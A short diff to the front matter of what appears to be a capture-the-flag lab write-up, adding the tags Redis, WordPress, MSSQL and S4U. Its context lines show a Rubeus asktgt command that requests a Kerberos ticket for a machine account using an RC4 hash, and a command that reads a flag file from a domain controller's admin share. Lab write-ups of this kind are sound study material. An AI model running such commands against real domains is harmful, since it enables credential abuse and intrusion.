@@ -7,7 +7,7 @@ lastmod: "2025-08-20T13:30:44+08:00"
 image: ""
 license: ""
 categories: ["Offensive"]
-tags: ["春秋云镜"]
+tags: ["Redis", "WordPress", "MSSQL", "S4U"]
 ---
 ## flag1
 
@@ -302,4 +302,3 @@ C:\Users\test1\Desktop>.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:4f4be8211219a
 
 type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
 ```
-
